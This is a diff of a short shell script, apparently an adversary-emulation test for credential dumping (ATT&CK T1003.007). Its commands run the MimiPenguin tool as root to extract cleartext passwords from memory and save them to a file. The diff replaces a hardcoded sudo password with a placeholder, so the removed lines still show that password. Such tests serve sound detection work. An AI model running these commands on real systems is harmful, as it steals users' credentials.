@@ -1,10 +1,10 @@
 ;
 #pre
-echo "010404grz" | sudo -S sh -c '((which yum && sudo yum -y install binutils python2 libc-bin) || (which apt-get && sudo DEBIAN_FRONTEND=noninteractive apt-get install -y binutils python2 libc-bin))'
+echo "%password%" | sudo -S sh -c '((which yum && sudo yum -y install binutils python2 libc-bin) || (which apt-get && sudo DEBIAN_FRONTEND=noninteractive apt-get install -y binutils python2 libc-bin))'
 mkdir /tmp/mimipenguin
 tar -xzvf "/tmp/mimipenguin.tar.gz" -C /tmp/mimipenguin
 #command
-echo "010404grz" | sudo -S /tmp/mimipenguin/mimipenguin_2.0-release/mimipenguin.sh > /tmp/T1003.007Test3.txt
+echo "%password%" | sudo -S /tmp/mimipenguin/mimipenguin_2.0-release/mimipenguin.sh > /tmp/T1003.007Test3.txt
 #check
 echo "尝试使用MimiPenguin从内存中检索密码，并将其输出到指定的文件中："
 cat /tmp/T1003.007Test3.txt
